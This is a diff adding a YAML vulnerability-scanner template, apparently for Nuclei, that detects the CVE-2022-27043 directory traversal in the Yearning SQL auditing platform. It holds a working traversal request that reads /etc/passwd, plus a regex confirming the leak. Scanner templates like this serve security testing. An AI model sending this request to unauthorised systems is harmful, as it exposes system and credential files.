@@ -1,0 +1,29 @@
+id: yearning-front-api-arbitrary-file-read
+
+info:
+  name: Yearning API Arbitrary File Read (CVE-2022-27043)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Yearning is a MySQL SQL auditing platform. Versions 2.3.1, 2.3.2, and 2.3.4-2.3.6 are vulnerable to a directory traversal vulnerability, allowing attackers to read arbitrary files, potentially exposing sensitive information.
+  classification:
+    cvss-metrics: 7.5
+    cvss-score: 7.5
+    cve-id: CVE-2022-27043
+  tags: directory-traversal
+
+http:
+  - raw:
+      - |
+        GET /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
